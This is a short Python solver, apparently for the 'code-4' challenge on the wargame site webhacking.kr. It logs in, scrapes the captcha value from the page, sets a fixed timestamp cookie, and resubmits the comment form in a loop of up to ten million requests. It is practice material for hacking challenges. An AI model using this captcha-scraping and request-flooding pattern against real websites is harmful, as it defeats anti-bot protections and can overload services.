import requests
from bs4 import BeautifulSoup
import json
session=requests.session()
info={
}
info['id']=input("id입력")
info['pw']=input("pw입력")
info=json.dumps(info)
response=session.post("https://webhacking.kr/login.php?login", data=info)
print(response)
response = session.get("https://webhacking.kr/challenge/code-4/")
html=response.text
soup = BeautifulSoup(html, "html.parser")
a = str(soup.find('input', {'name':'captcha_'}))
print(a)
index=a.find("value")
start=index+7
value=""
while(a[start]!="\""):
    value+=a[start]
    start+=1
print(value)
info2={

}
info2['id']="a"
info2['cmt']="a"
info2['captcha']=value
info2=json.dumps(info2)
cookie={'st':'1679876340'}
for i in range(0, 10000000):
    response=session.post("https://webhacking.kr/challenge/code-4/", data=info2, cookies=cookie)
    print(response)
